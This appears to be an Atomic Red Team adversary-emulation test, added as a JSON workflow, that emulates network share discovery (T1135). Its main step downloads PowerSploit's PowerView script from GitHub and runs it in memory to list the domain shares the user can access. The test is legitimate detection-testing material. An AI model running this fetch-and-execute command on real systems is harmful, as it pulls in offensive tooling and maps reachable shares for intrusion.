@@ -1,0 +1,78 @@
+{
+  "id": "b1636f0a-ba82-435c-b699-0d78794d8bfd",
+  "name": "Share Discovery with PowerView",
+  "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "1040804f-466c-42d9-a84c-f23cdf8a9f95",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4438bc6c-ca73-4ea2-8bab-1139e1185ed4",
+      "name": "Check dependency 1/1",
+      "description": "Endpoint must be joined to domain\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d93b88b6-ace0-4f5b-bbd1-e71ce5c5a37c",
+      "name": "Resolve dependency 1/1",
+      "description": "Endpoint must be joined to domain\n",
+      "type": "execute-command",
+      "data": {
+        "command": "\"Join system to domain\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1e9e523a-b551-4271-a6af-75e25fe1ca9a",
+      "name": "Re-check dependency 1/1",
+      "description": "Endpoint must be joined to domain\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "4438bc6c-ca73-4ea2-8bab-1139e1185ed4",
+      "p": "on-success",
+      "o": "1040804f-466c-42d9-a84c-f23cdf8a9f95"
+    },
+    {
+      "s": "4438bc6c-ca73-4ea2-8bab-1139e1185ed4",
+      "p": "on-failure",
+      "o": "d93b88b6-ace0-4f5b-bbd1-e71ce5c5a37c"
+    },
+    {
+      "s": "d93b88b6-ace0-4f5b-bbd1-e71ce5c5a37c",
+      "p": "on-success",
+      "o": "1e9e523a-b551-4271-a6af-75e25fe1ca9a"
+    },
+    {
+      "s": "1e9e523a-b551-4271-a6af-75e25fe1ca9a",
+      "p": "on-failure",
+      "o": "1040804f-466c-42d9-a84c-f23cdf8a9f95"
+    }
+  ],
+  "tags": [
+    "T1135",
+    "atomic-red-team"
+  ]
+}
